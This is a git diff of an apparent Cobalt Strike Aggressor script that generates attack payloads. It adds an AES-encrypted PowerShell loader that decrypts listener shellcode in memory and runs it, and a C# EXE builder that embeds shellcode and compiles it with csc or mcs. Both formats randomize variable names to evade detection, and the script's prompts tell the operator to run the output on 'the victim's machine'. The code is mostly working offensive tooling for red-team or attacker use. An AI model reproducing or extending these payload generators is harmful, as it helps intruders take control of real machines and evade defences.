@@ -39,15 +39,38 @@
 #	NOTE: Python must be installed, because writing the RC4 alg in 
 #	Sleep is ridiculous.
 
+# AES Powershell
+#
+#	Generates an AES encrypted payload. Gets decrypted in memory and executed.
+#	NOTE: Python must be installed, because writing the AES alg in
+#	Sleep is also ridiculous.
+
+# Small C# Executable
+#
+#	Generates a C# based EXE. No real evasion has been attempted.
+#	It's like 6kb in size, though.
+#	.NET 4.5 required if compiling on Windows
+#	msc required if compiling on linux (Kali Tested) 
+
 # Change this to set the payloads to External/Internal Hosts / IPs
 
 global('$hostip', '$jsport', '$ssl','$TEMPDIR');
 $hostip = localip();
 $jsport = "80";
 $ssl = "false";
-$TEMPDIR = cwd(). "/payloads/";
+$TEMPDIR = cwd() . "/payloads/";
 
 ######################################
+
+# Most Ghetto OS Detection award goes to...
+
+if (substr(cwd(), 0, 1) eq "/") {
+		$os = "linux";
+	}
+else {
+		$os = "windows";
+		$TEMPDIR = strrep($TEMPDIR, "/", "\\")
+	}
 
 mkdir(cwd(). "/payloads/");
 menubar("More Payloads", "morepayloads", 2);
@@ -68,7 +91,6 @@ sub jssettings {
 	drow_checkbox($dialog, "ssl", "SSL: ", "Use SSL?");
 	dbutton_action($dialog, "Save");
 	dialog_show($dialog);
-
 }
 
 sub jssettingsupdate {
@@ -107,7 +129,7 @@ sub generate_payload {
 	dialog_description($dialog, "Generates a payload from a user created template.");
 	drow_listener($dialog, "listener", "Listener: ");
 	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged","Stageless"));
-	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript", "JSP","WAR","PowerLessShell"));
+	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript", "JSP","WAR","PowerLessShell","PowerShell w/ AES","Small C# EXE"));
 	drow_checkbox($dialog, "x64", "x64: ", "Use x64 Payload")
 	dbutton_action($dialog, "Generate");
 	dialog_show($dialog);
@@ -272,7 +294,7 @@ sub output {
 			$handle = openf(script_resource("./templates/powerlessshell_template.xml"));
 			$data   = readb($handle, -1);
 			$rc4key = random_string("32");
-			$key_formatted = format_rc4($rc4key);
+			$key_formatted = format_bytes($rc4key);
 			$rc4_python = script_resource("./assets/rc4.py");
 			$runrc4 = exec("python ".$rc4_python ." $rc4key \"$payload_string\"");
 			@result = readAll($runrc4);
@@ -293,6 +315,78 @@ sub output {
 				$filename = pop(split("/", $1));
 				prompt_text("Execute the below on a victim's machine.", "\%WINDIR\%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ". $filename, {
 				});
+			});
+		}
+	}
+	else if ($3['output'] eq 'PowerShell w/ AES') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
+			if ($3['payload_type'] eq "Staged") {
+				show_message("Stageless Payload Only for AES Powershell.");
+			}
+			$payload_string = base64_encode(shellcode($3['listener'], false, $arch));
+			$handle = openf(script_resource("./templates/ps1_AES_template_".$arch.".ps1"));
+			$data   = readb($handle, -1);
+			$aeskey = random_string("32");
+			$aes_python = script_resource("./assets/aes.py");
+			$runaes = exec("python ".$aes_python ." $aeskey \"$payload_string\"");
+			@result = readAll($runaes);
+			$encrypted_payload = @result[0];
+			closef($runaes);
+			$fdata = $data;
+			for ($r = 0; $r < 50; $r++) {
+				$rstring = random_string(rand(range("5-10")));
+				$data = strrep($data, "%%VAR".$r."%%", $rstring);
+			}
+			$fdata = strrep($data, "%%PAYLOAD%%", $encrypted_payload, "%%CIPHER%%", $aeskey);
+			closef($handle);
+			$name = prompt_file_save("payload.ps1", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				$filename = pop(split("/", $1));
+				show_message("Execute the PowerShell script on the victim's machine.");
+			});
+		}
+	}
+	else if ($3['output'] eq 'Small C# EXE') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
+			if ($3['payload_type'] eq "Staged") {
+				show_message("Stageless Payload Only for Small C# EXE.");
+			}
+			if ($os eq "windows") {
+				$compiler = "C:/Windows/Microsoft.NET/Framework/v4.0.30319/csc.exe";
+			}
+			else if ($os eq "linux") {
+				$compiler = "mcs";
+			}
+			#Fix the shellcode...
+			$shellcode = shellcode($3['listener'], false, $arch);
+			$sc_size = strlen($shellcode);
+			$payload_string = format_bytes($shellcode);
+			$handle = openf(script_resource("./templates/csharp_template.cs"));
+			$data   = readb($handle, -1);
+			for ($r = 0; $r < 50; $r++) {
+				$rstring = random_string(rand(range("5-10")));
+				$data = strrep($data, "%%VAR".$r."%%", $rstring);
+			}
+			$fdata = strrep($data, "%%DATA%%", $payload_string, "%%LENGTH%%", $sc_size);
+			closef($handle);
+			$tempcs = openf(">".$TEMPDIR."temp.cs ");
+			writeb($tempcs, $fdata);
+			closef($tempcs);
+			$name = prompt_file_save("payload.exe", {
+				exec($compiler . " -platform:" . $arch . " -t:winexe -out:" . $1 . " " . $TEMPDIR."temp.cs" );
+				#println($compiler . " -platform:" . $arch . " -t:winexe -out:" . $1 . " " . $TEMPDIR."temp.cs");
+				show_message("Execute the file on the victims machine.");
 			});
 		}
 	}
@@ -366,7 +460,7 @@ sub exe {
 	closef($handle);
 }
 
-sub format_rc4 {
+sub format_bytes {
 	$key = $1;
 	@fmt = str_chunk(transform($key, "hex"), 2);
 	return "0x". join(", 0x", @fmt);
